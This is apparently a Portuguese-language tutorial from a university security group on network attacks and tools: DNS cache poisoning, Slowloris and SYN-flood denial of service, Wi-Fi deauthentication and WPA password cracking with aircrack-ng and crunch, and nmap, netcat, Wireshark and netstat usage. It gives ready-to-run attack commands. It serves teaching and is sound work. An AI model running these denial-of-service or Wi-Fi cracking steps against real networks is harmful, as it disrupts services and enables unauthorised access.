PARABÉNS!! Você acabou de passar na faculdade :). No seu primeiro dia, você pisa no ICMC e precisa ir para a sala 5-001 ter aula de Cálculo. Mas onde ela fica???

Para se achar lá dentro, você abre o Guia dos Bixos e vai rever como funciona a numeração das salas. Chegando lá, você vê tudo vazio e volta pra casa sem entender nada. A questão é: quem te falou que a aula seria nessa sala foi um veterano chatão que só quer ver fogo no parquinho e falou qualquer número.

O DNS Cache Poisoning funciona mais ou menos dessa forma. O atacante (veterano chatão) "envenena" o DNS Cache (nesse caso, a informação que você recebe), podendo redirecionar a vítima para qualquer site que ele quiser, normalmente malicioso.

**Como envenenam o DNS Cache**
Quando um usuário acessa um site, o navegador precisa realizar toda resolução do endereço IP. Ele faz o _request_, com um Transaction ID específico (um inteiro de 16 bits aleatório) utilizado para validar a resposta daquele _request_ (só é aceita uma resposta com o mesmo ID). Essa requisição chega até o DNS Server que responde com o respectivo endereço IP utilizando o mesmo Transaction ID.

O atacante, então, precisa estabelecer um Man-In-The-Middle (MITM) para que ele possa interceptar os requests de resolução de domínio, verificar o Transaction ID, forjar uma _response_ maliciosa (válida) e enviar para a vítima.

A vítima salva essa resposta em sua DNS Cache, até que ela expire depois de um tempo definido pelo _time-to-live._ Então, o domínio precisa ser resolvido novamente.
## Slow Loris
![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fwww.cloudflare.com%2Fimg%2Flearning%2Fddos%2Fddos-slowloris-attack%2Fslowloris-attack-diagram.png&width=768&dpr=4&quality=100&sign=bcafed59&sv=1)

A ideia por trás do Slow Loris é abrir várias conexões TCP com um servidor web e, em cada uma delas, enviar de tempos em tempos uma parte de uma requisição GET. O servidor acha que as conexões estão lentas, mas que são legítimas, então ele as mantêm, impedindo outras conexões de usuários comuns.

Para esse ataque, vamos usar [esse código maravilindo](https://github.com/gkbrk/slowloris). Primeiro clonamos o repositório:
```
$ git clone https://github.com/gkbrk/slowloris
```

Depois entramos no repositório clonado:
```
$ cd slowloris
```

É possível que você precise especificar um caminho diferente ao `cd`, dependendo da pasta para onde o repositório foi clonado e da pasta onde você está.

Finalmente, basta usar o python para executar o código, passando o IP do alvo (nesse caso, nosso alvo é `10.10.10.10`):
```
$ python3 slowloris.py 10.10.10.10
```

Ou apenas o domínio, caso exista:
```
$ python3 slowloris.py example.com
```

Existe uma outra versão do Slow Loris que se chama R U Dead Yet, que envia requisições POST ao invés de GET.
## Syn Flood
![Imagem](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fwww.gta.ufrj.br%2Fgrad%2F15_1%2Fdos%2Fimages%2Fsyn_flood.png&width=768&dpr=4&quality=100&sign=62ad003f&sv=1)
Quando sua máquina conversa com outra através da internet ela quase sempre usa o protocolo TCP. Esse protocolo permite que duas máquinas abram uma conexão, ou seja, um canal de comunicação preestabelecido.

Para que essa conexão seja feita é realizado um procedimento chamado Three-way handshake, ou, numa tradução livre, Aperto de mão em três vias. O ataque SYN Flood toma vantagem justamente de um comportamento inusitado desse procedimento.

Imagine que a máquina A manda o SYN, mas ela não recebe um SYN/ACK como resposta. Isso pode acontecer por diversos fatores: problemas na rede, firewals mal configurados, quedas de energia, etc.

É por isso que o protocolo TCP tem os pacotes ACK, trata-se de um mecanismo de confirmação de recebimento de mensagens. Nesse caso, a máquina A entenderia que algo de errado aconteceu e ela reenviaria o pacote SYN. Da mesma forma, se a máquina B envia o SYN/ACK mas recebe um SYN novamente de A, ela entende que A não recebeu o seu SYN/ACK e reenviou o SYN.

O ataque então faz o seguinte: nós enviamos pacotes SYN sem parar, não importando qual seja a resposta do alvo. Ele pensará que nós realmente não estamos recebendo suas respostas e manterá várias conexões abertas por um tempo considerável.

Isso faz com que a tabela de conexões do alvo fique lotada com as nossas conexões, impedindo-o de abrir conexões com outras máquinas.

Para isso, usaremos uma ferramenta chamada Hping3:

`sudo hping3 -c <quantidade de pacotes> -d <tamanho do pacote> -S -p <porta alvo> -i u<tempo> --flood <ip do alvo>`

-c : Quantidade de pacotes a serem enviados 
-d : Tamanho de cada pacote a ser enviado 
-S: Usar a flag SYN do TCP 
-p : Porta da máquina destino (em geral não importa, desde que seja uma porta onde há um socket em modo LISTEN) 
-i u : tempo entre envios (em milissegundos: u100 == 100 milissegundos entre pacotes) 
--flood: Envia pacotes o mais rápido possível

## WPA Cracking
A principal ideia por trás do WPA Cracking Attack é se aproveitar de vulnerabilidades existentes na conexão Wi-Fi para brutar a senha de uma rede. Ele consiste em 3 principais passos:
- Monitorar um ponto de acesso.
- Forçar uma desautenticação de um dos clientes da rede.
- Capturar a reautenticação/handshake desse cliente com o ponto de acesso.
- Crackear o handshake (bruteforce).

De forma que poderemos saber se alguma das chaves contidas numa `WORDLIST` corresponde à senha da rede monitorada.
### Definições
#### WPA/WPA2
Assim como seu antecessor WEP, são protocolo de segurança criados para proteger redes WiFi.
#### Interface de monitoramento
Normalmente, a interface wireless da sua placa de rede está responsável por capturar apenas os pacotes destinados para o seu computador, ou seja, apenas aqueles enviados pela rede Wifi na qual está conectado. Quando ativamos o modo monitoramento, no entanto, conseguimos inspecionar os mais diversos pacotes de todos os pontos de acesso ao seu redor.
#### Ponto de Acesso (AP)
São os dispositivos que permitem hosts se conectarem a uma rede, como por exemplo roteadores.
#### BSSID e ESSID
**BSSID** diz respeito ao próprio endereço MAC do ponto de acesso; enquanto ESSID/SSID, ao nome público desse.
#### WORDLISTS
São listas de senhas em _plain text_ geralmente conseguidas por meio de vazamentos de grandes bancos de dados. Elas são comumente utilizadas para testes de _password cracking, e uma das mais famosas se trata da [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
### 4-Way Handshake
![](https://upload.wikimedia.org/wikipedia/commons/a/ac/4-way-handshake.svg)
### Deauthentication Attack
![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fthumb%2F9%2F95%2FDeauth_attack_sequence_diagram.svg%2F800px-Deauth_attack_sequence_diagram.svg.png&width=768&dpr=4&quality=100&sign=163e67c0&sv=1)
O protocolo IEEE 802.11 (WiFi) possui um _"pacote"_, o qual na verdade trata-se de apenas um frame, de controle chamado deauthentication frame que avisa ao cliente que ele foi desconectado da rede.

Como o protocolo não exige nenhuma encriptação desse frame, se "fingindo" de AP (spoofing), o atacante pode manda-lo conhecendo apenas o endereço MAC da vítima e do ponto de acesso.
## Deauth
Esse ataque consiste em utilizar uma operação presente na especificação do 802.11. É o comando de desautenticação. Ele permite que os AP's enviem esse comando para os clientes se desconectarem da rede wifi, contudo é possível fraudar esse comando e desconectar um cliente maliciosamente.

Para realizar esse ataque, precisaremos de um adaptador wireless capaz de entrar em modo _monitor_ (i.e. capaz de ler frames não endereçados a ele). Além disso, também precisa ser capaz de injetar pacotes fraudados - especialmente pacotes _deauth_. Tendo satisfeito essas duas condições, será possível realizar o ataque utilizando a suíte _aircrack-ng_. Para testar a viabilidade do ataque com seu adaptador wi-fi, siga os passos abaixo.
### Teste de compatibilidade
Precisaremos inicialmente baixar a suíte de aplicações _aircrack-ng_, ela contém todos os programas necessários para testar sua placa de rede (i.e. adaptador wi-fi) e para executar o ataque. Para distros baseadas em Debian (i.e. usam o gerenciador de pacotes `apt`), basta executar (com `sudo` ou como usuário `root`):

```
pacman -S aircrack-ng
```

Bem, a partir de agora, as coisas ficam um pouquinho mais complicadas. Precisamos encontrar o nome da sua interface de rede dado pelo sistema operacional. Execute:

```
ip a
```

E verifique a saída procurando por `wlanX` ou `wlpXsYfZ`, em que X, Y e Z são números. Segue abaixo um exemplo.

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: wwan0: <POINTOPOINT,NOARP> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/none 
3: enp0s31f6: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 00:2c:37:a4:88:02 brd ff:ff:ff:ff:ff:ff
4: wlp0s20f3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether f9:e4:e3:e3:a5:ce brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.6/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp0s20f3
       valid_lft 83560sec preferred_lft 83560sec
    inet6 fe80::e7c:e4bd:fa21:ac21/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Neste caso, a interface de interesse é `wlp0s20f3`. Sabendo disso, já podemos iniciar os testes.

**A partir de agora, você vai ficar sem conexão wi-fi**

Primeiramente é necessário matar os processos que podem interferir no processo de troca para o modo de monitoramento:

```
airmon-ng check kill
```

Guarde quais processos foram mostrados como saída do comando, pois precisaremos reativá-los depois.

Agora já é possível trocar para o modo de monitoramento com:

```
airmon-ng start wlan0
```

Será criada uma nova interface com o mesmo nome da sua original, mas com _mon_ adicionado ao fim. A partir deste exemplo, será criada a interface `wlpXsYfZmon`. Agora já é possível verificar se o seu adaptador de rede permite o modo de monitoramento. Isto pode ser feito com:

```
airodump-ng wlan0mon
```

Se várias redes wi-fi aparecerem no terminal, seu adaptador de rede permite o modo monitoramento!

Por fim, o último passo é verificar se o adaptador permite a injeção de pacotes. Para isso, execute:

```
aireplay-ng --test wlan0mon
```

A saída desse comando vai indicar o sucesso ou fracasso da injeção de pacotes.

Pronto, se você passou por todos esses passos e foi bem-sucedido, será possível executar o ataque de desautenticação.

#### Recuperando a conexão wi-fi
Para recuperar a conexão wi-fi, precisamos sair do modo monitoramento e reativar os processos que foram mortos. O primeiro passo é:

```
airmon-ng stop wlan0mon
```

Para sistemas baseados em Debian (pode funcionar para outros também - se você usa uma distro que necessita de uma solução diferente, faça um MR para colocar ela nesse tutorial, execute os comandos abaixo.

```
systemctl restart wpa_supplicant
systemctl restart NetworkManager
```
# Ferramentas
## Suíte Aircrack
Agora que já sabemos como funciona a teoria, para aplicar o WPA Attack utilizaremos o pacote de ferramentas [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=Main), o qual pode ser instalado com:

```
sudo apt-get install -y aircrack-ng
```
### Escolhendo a interface de monitoramento
Antes de começar o ataque em si, precisamos descobrir qual interface de rede utilizaremos para monitorar os pacotes em circulação:
```
iwconfig
```
### Airmon
Depois, utilizando o `airmon-ng` podemos ergue-la em modo monitoramento:
```
airmon-ng check kill && sudo airmon-ng start <INTERFACE>
```
_Vale ressaltar que assim que realizarmos esse passo, seu acesso à internet será cortado. Mas não se desespere! Se você seguir esse tutorial até o final,_ reestabeleceremos sua conexão. Além disso, o nome de sua interface será acrescido do sufixo 'mon'.
### Airodump
Agora, podemos listar todos os wifis/pontos de acesso por meio dos pacotes que chegam até a interface:
```
sudo airodump-ng <INTERFACE>
```

Assim que o wifi que se deseja crackear aparecer na lista, podemos dar `Ctrl+C` para parar o airodump e salvar seu `BSSID` e `CHANNEL`. Em seguida, podemos inspecionar com mais precisão todos os pacotes que circulam por ele com:

```
sudo airodump-ng -w <OUTFILE> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
```
### Aireplay
Simultaneamente em outro terminal, podemos executar um deauthentication attack em alguns dos clientes da rede dado seu `STATION_NUMBER`:
```
sudo aireplay-ng --deauth <TIMES> -a <BSSID> -c <CLIENT_STATION_NUMEBR> <INTERFACE>
```
### Aircrack
Por fim, agora que temos os handshakes, podemos usar o `aircrack-ng` para conseguir a senha de acesso utilizando alguma `WORDLIST`:
```
aircrack-ng <HANDSHAKE_FILE> -w <WORDLIST> -l <OUTFILE>
```
### Crunch
Caso não queira usar um dicionário, podemos brutar todas as possibilidades de senhas utilizando o `crunch`
Primeiramente, para instalá-lo:
```
sudo apt-get install crunch
```

Agora, utilizando o aircrack em pipeline:
```
crunch <MIN> <MAX> <CHARSET> | aircrack-ng -b <BSSID> -w - <HANDSHAKE_FILE> -l <OUTFILE>
```
### Restaurando sua conexão
Para recuperar a conexão wi-fi, precisamos sair do modo monitoramento e reativar os processos que foram mortos. O primeiro passo é:

```
airmon-ng stop wlan0mon
```

Para sistemas baseados em Debian (pode funcionar para outros também - se você usa uma distro que necessita de uma solução diferente, faça um MR para colocar ela nesse tutorial, execute os comandos abaixo.

```
systemctl restart wpa_supplicant
systemctl restart NetworkManager
```
## Wireshark
O wireshark é uma ferramenta que permite analisar os protocolos e dados trafegando, por exemplo, entre seu computador e a internet.
### Funcionamento Básico
Para ver as informações que estão saindo do seu computador, basta iniciaro wireshark e selecionar de qual interface de rede capturará as informações. Essa a interface de rede é a porta de saída para os programas enviarem informações para a rede, ela pode ser cabeada (normalmente chamada de `eth0` ou `enp3s0`), ou wireless (então é `wlan0` ou `wlp3s0`), mas cada SO pode atribuir um nome específico. Para checar as interfaces, digite o seguinte comando:

```
ip address show
```

Depois de selecionar a interface da qual capturará as informações, você deve iniciar a captura clicando no botão mostrado abaixo ("Start"), ou utilizando o atalho de teclado _Ctrl+E_. A partir de agora você estará gravando todos os pacotes trafegando entre a rede e o computador por a interface definida anteriormente. Se você apertar _Ctrl+E_ novamente, ou clicar no botão de parada ("Stop"), a captura será encerrada e todos os pacotes capturados permanecerão na tela.

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fwww.wireshark.org%2Fdocs%2Fwsug_html_chunked%2Fwsug_graphics%2Fws-capture-menu.png&width=768&dpr=4&quality=100&sign=6e740a67&sv=1)

Agora que todos os pacotes estão na tela, você pode querer analisá-los, ou deixar para um outro momento. Caso opte pela segunda opção, poderá salvar os pacotes capturados como um arquivo com formato _pcap_. Esse é um ponto importante porque também é possível inicializar o wireshark lendo diretamente um arquivo _pcap_, isto também pode ser feito do terminal executando o seguinte comando:

```
wireshark file.pcap
```
### Lendo pacotes
Agora que já capturamos alguns pacotes, está na hora de analisá-los. Vamos ver juntos um exemplo de pacote, no caso, o primeiro pacote enviado quando há uma conexão SSL (faz a criptografia dos dados enviados). Nesse pacote inicial, o cliente envia um "oi" para o servidor dizendo que quer iniciar a conexão.

Nós temos duas opções de visualizações de pacotes, a primeira é a mostrada abaixo. Nela o programa nos mostra as camadas do pacote e os respectivos dados de cada uma de uma maneira bastante organizada e simples. Vemos que este conjunto de dados é um _frame_, o quadro da camada de enlace. Ele engloba os dados e cabeçalhos de todas as outras camadas, mas o wireshark permite ver as informações de cada cabeçalho separadamente. Isto é, podemos ver que temos o protocolo Ethernet com os MAC's de origem e destino, em seguida, o protocolo IP com os ip's de origem e destino, então o protocolo TCP com as portas de origem e destino e algumas outras informações do protocolo e finalmente o protocolo TLS que envia o `"Client Hello"`.

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fjvns.ca%2Fimages%2Fwireshark_packet_details_list.png&width=768&dpr=4&quality=100&sign=9b86bdbd&sv=1)

A segunda maneira de visualizar os dados é mostrando os bytes crus. Temos acesso aos bytes de dados enviados ao lado esquerdo e aos valores decodificados para caracteres à direita. Então é possível passar o mouse sobre os caracteres e o wireshark indica os bytes correspondentes e vice-versa, e ainda indica a qual campo o dado pertence. No exemplo abaixo, `tiles.services.mozilla.com` corresponde ao campo "Server Name".

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fjvns.ca%2Fimages%2Fwireshark_packet_details.png&width=768&dpr=4&quality=100&sign=a3a4bb88&sv=1)
### Seguindo uma única conexão
Muitas vezes aparecem dados de diversas conexões TCP, mas estamos querendo ver somente uma. Para isso, o wireshark fornece uma forma simples de acompanhar uma conexão específica, basta clicar com o botão direito no pacote e selecionar "Conversation filter" -> "TCP".

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fjvns.ca%2Fimages%2Fwireshark_filter.png&width=768&dpr=4&quality=100&sign=affb3559&sv=1)
### Aplicando filtros
O wireshark também permite que você utilize filtros para especificar aspectos dos pacotes mostrados. Alguns exemplos são mostrados abaixo, mas existem muitos outros que vocÊ aprenderá conforme for utilizando o wireshark.
- `frame contains "mozilla"`: filtra por pacotes que contenham a string "mozilla";
- `tcp.port == 443`: filtra por pacotes cuja porta de destino é a 443 (https);
- `dns.resp.len > 0`: mostra todas as respostas DNS;
- `ip.addr == 192.168.15.1`: mostra todos os pacotes com _ip_ de origem ou destino igual a `192.168.15.1`.
### Apackets
Esse [site](https://apackets.com/upload) faz um relatório a partir de um arquivo pcap ou pcapng
## Netcat
Se você é responsável pela segurança de uma rede ou de um sistema, é essencial que você saiba utilizar os recursos que o Netcat proporciona. O Netcat é um ferramenta simples (mas poderosa) que lê e envia dados através de conexões de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta de "back-end" compacta que pode ser usada direta e facilmente por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de exploração de redes com muitas funcionabilidades, pois pode criar praticamente qualquer tipo de conexão necessária e possui vários recursos internos interessantes.
### Funcionamento básico
O uso mais simples (e mais frequente) do netcat cria uma conexão TCP com a porta especificada no host de destino também especificado. Sua entrada padrão (STDIN) é então enviada ao host e tudo o que retorna através da conexão é enviado à sua saída padrão (STDOUT). Isso continua indefinidamente, até que a conexão seja desligada.

`$ nc <ip alvo> <porta>`
Conecta-se em uma porta arbitrária no ip alvo.

O Netcat também pode funcionar como um servidor, escutando possíveis conexões em portas arbitrárias e, em seguida, fazendo a mesma leitura e escrita descrita acima.

`$ nc -l -p <porta local>`
Cria um ouvinte na porta local.
### Algumas flags de comando
`-l` : Coloca no netcat em estado de escuta (listening)

`-p` : Especifica a porta a ser usada (sujeito a disponibilidade e a restrições de privilégio)

`-u` : Usar UDP ao invés de TCP

`-n` : Força o netcat a usar apenas endereços de IP numéricos, sem fazer consultas a servidores DNS

`-e` : Especifica o programa a ser executado depois de a conexão acontecer, ligando entradas e saídas ao programa

`-s` : Especifica o endereço IP da interface usada para enviar os pacotes. Pode ser usado para spoofing de IPs.

`-v` : Controla o nível de mensagens mostradas na tela

`-w` : Limita o tempo máximo para que uma conexão seja estabelecida

### Enviar arquivo do cliente para o ouvinte
`$ nc -l -p <porta local> > <arquivo de saida>`
Ouve na porta porta local e armazena resultado no arquivo de saida.

`$ nc -w3 <ip alvo> <porta> < <arquivo de entrada>`
Envia o arquivo de entrada para o ip alvo em uma porta.

### Receber arquivo do ouvinte para o cliente
`$ nc -l -p <porta local> > <arquivo de entrada>`
Ouve em uma porta local e prepara para enviar o arquivo de entrada.

`$ nc -w3 <ip alvo> <porta> > <arquivo de saida>`
Conecta com o ip alvo em uma porta e envia o arquivo de saída.
### Enviando mensagem
#### Primeiro Método
```
$ echo -n "mensagem" | nc -n -N <ip> <port>
```
#### Segundo Método
```
$ unbuffer echo "Your message" | nc <destination_ip> <port_number>
```
## Nmap
Você já logou numa rede que não era a sua (ou a sua mesmo) e queria saber quais os dispositivos ligados naquela rede? Ou melhor, qual o IP do access point ao qual você está conectado? Quais as portas abertas naquele servidor safado que você tá tentando invadir. Nmap is here for you.

### Comandos básicos
#### Host Discovery
Vamos começar com um básico, descobrir todos os IPs dos dispositivos conectados à rede local (supondo que você sabe o endereço da rede e a máscara de subrede):
```
# nmap <ip da rede>/<máscara> -sn
nmap 192.168.15.0/24 -sn
```
#### Scan Básico
Beleza, agora você já sabe quem são todos os hosts na sua rede. Digamos que a Merindrola, seu alvo, está no `192.168.15.40`. Mas o que está rodando na máquina dela? O que podemos tentar atacar? Para isso podemos usar um _port scanning_:
```
# nmap <ip do alvo>
nmap 192.168.15.40
```
Isso vai nos dar informações básicas sobre as portas mais importantes
#### Scan em mais portas
O scan básico que fizemos anteriormente vai focar em portas famosas, ou _well-known ports. Mas e se a Merindrola foi sapeca e "escondeu" seus serviços em portas bizarras (por exemplo a HTTP na 7890 ao invés da 80)? Nmap neles:
```
# nmap <ip do alvo> -p [<portas>, <range de portas>]
nmap 192.168.15.40 -p 7890 # scan na porta 7890 (como o protocolo não foi especificado, vai ser na TCP)
nmap 192.168.15.40 -p 2000-8000 # scan nas portas 2000 até 8000
nmap 192.168.15.40 -p- # scan em TODAS as portas
```
#### Serviços e Versões
Beleza, agora sabemos o IP da Merindrola e as portas abertas na máquina dela. Mas o que tem atrás dessas portas? O nmap geralmente por padrão tenta mandar uma série de pacotes especiais que, de acordo com a resposta da aplicação, ele consegue adivinhar qual é o serviço rodando numa porta. Mas para economizar tempo, o nmap não tenta todas as possibilidades de payload em todas as portas (até porque isso nunca acabaria rs).

Digamos que nós encontramos um servidor web rodando na porta 80 da Merindrola. O nmap tem payloads que nos permitem adivinhar qual exatamente é o servidor web (apache, nginx, etc.):

```
# nmap <ip do alvo> -sC
nmap 192.168.15.40 -sC
```

...e até a versão dele:

```
# nmap <ip do alvo> -sV
nmap 192.168.15.40 -sV
```

Melhor já ir direto nos dois!

```
# nmap <ip do alvo> -sC -sV
nmap 192.168.15.40 -sC -sV
```

### Dicas e Hacks
Geralmente a saída do nmap é grande e você provavelmente quer salvá-la. Usar o redirecionador `>` para um arquivo é geralmente uma boa ideia:

```
nmap 192.168.15.40 > nmap.txt
```

Mas olhar a saída do nmap enquanto ele faz o scan é ainda mais legal. Você pode fazer as duas coisas ao mesmo tempo usando o comando `tee`:

```
tee nmap.txt nmap 192.168.15.40
# ou, outra forma de fazer a mesma coisa
nmap 192.168.15.40 | tee nmap.txt
```
### NSE: Nmap Scripting Engine
Talvez você encontre um desses aqui pela internet, mas quando você for um verdadeiro mago do nmap, você vai ser capaz de _fazer_ os seus e nunca mais depender de ninguém muahahaha.

```
# nmap --script=<nome do script> <ip do alvo>
nmap --script=my-evil-script.nse 192.168.15.40

# ou

# nmap --script <nome do script> <ip do alvo>
nmap --script my-evil-script.nse 192.168.15.40
```

O nmap possibilita que seus usuários criem scripts para automatizar tarefas mais específicas e complexas. Esses scripts são códigos mesmo, que você escreve na linguagem Lua e o nmap roda eles. Sabe quando a gente mandou o nmap fazer umas bruxarias mais complexas mais cedo para descobrir o tipo do servidor web e a sua versão? Adivinha? Ele nada mais fez do que rodar alguns desses scripts que são bem conhecidos e vêm instalados.

Em pentests e em máquinas do Hack The Box, situações em que você precisa ser bem preciso no seu trabalho de reconhecimento, talvez valha à pena procurar na internet por scripts customizados e mais específicos. Todo trabalho de invasão começa com um bom reconhecimento.
### Procurando protocolo UDP
```-sU```: Faz um scan para o protocolo UDP
## Netstat
Netstat (Network Statistics) é uma ferramenta utilizada para monitorar redes e, como o próprio nome diz, gerar estatísticas.

Algumas informacoes que conseguimos obter com o netstat são, por exemplo, quais portas de comunicacão TCP e UDP estão abertas na nossa maquina e quais os programas ouvindo nessas portas.
### Funcionamento básico
`$ netstat -a` Lista todas as conexões e portas abertas.

`$ netstat -at` Aplica um filtro (-t) no comando anterior, listando apenas as portas TCP.

`$ netstat -au` Aplica um filtro (-u) , listando apenas as portas UDP.

`$ netstat -atp` Com o acréssimo do p mostra também o programa que está sendo executado em cada porta.
### Gerando Estatísticas sobre a rede
`$ netstat -i` Para obter informações de uso das interfaces de rede.

`$ netstat -ie` Para detalhar ainda mais as informações mostradas

`$ netstat -s` Para obter estatísticas resumidas de cada um dos protocolos de rede (por exemplo, TCP, UDP, ICMP).

`$ netstat -rn` Para visualizar a tabela de routing da máquina.
## Kathará
O Kathará é uma ferramenta que permite a simulação de redes, máquinas e topologias inteiras através do docker. Ele é o sucessor do netkit e permite que os laboratórios do netkit sejam utilizados pelo kathará, somente em alguns casos específicos é necessário adaptação.
# FTP
FTP (File Transfer Protocol) é um protocolo de transferência de arquivos entre um cliente e um servidor que situa-se na camada de aplicação do modelo OSI.

O FTP foi desenvolvido em 1971 e foi criado para fornecer um método de transferência de arquivos seguro na ARPANET. Ao longo dos anos, o FTP foi sendo aprimorado, mas o ponto é que, por si só, é um protocolo antigo e cada vez está sendo menos adotado. Em janeiro de 2021, o Google Chrome parou de suportar o protocolo FTP.
## Funcionamento
O servidor FTP usa duas portas, em específico, para estabelecer uma conexão com o cliente:
- 20: porta utilizada para criar o canal de dados. Basicamente, é o canal onde os arquivos são enviados.
- 21: porta utilizada para criar o canal de controle/comandos. Nela, informações como usuário, senha, inserção e deleção de arquivos e navegação do usuário são transmitidas.
O funcionamento do FTP se dá de dois modos referentes ao servidor: ativo e passivo.
### Ativo
![Ativo](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F2cc1d52db498063d39908b985820d10ebb4dc449.png%3Fgeneration%3D1618639756959789%26alt%3Dmedia&width=768&dpr=1&quality=100&sign=2d0ed62d&sv=1)
Ela se dá do seguinte modo:
1. O cliente a partir de uma porta x comunica-se com a porta 21 do servidor pelo canal de controle
2. Cliente requisita um arquivo e informa a porta na qual deseja receber ele, no nosso caso, chamaremos de porta y
3. O servidor a partir da porta 20 envia, de forma ativa, o arquivo para a porta y
### Passivo
![Passivo](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F4bf65b6dac7f5df32aaa55dfb3394658c9e6a928.png%3Fgeneration%3D1618639757889576%26alt%3Dmedia&width=768&dpr=1&quality=100&sign=b0af07c5&sv=1)
A comunicação no **modo passivo** se dá nos seguintes passos:
1. O cliente a partir de uma porta x comunica-se com a porta 21 do servidor pelo canal de controle, especificando que a comunicação se dará de modo passivo
2. Servidor retorna uma mensagem para a porta x do cliente informando que a porta passiva do servidor será a porta y
3. Caso o cliente deseje pegar um arquivo, ele vai até a porta y do servidor e pega o arquivo
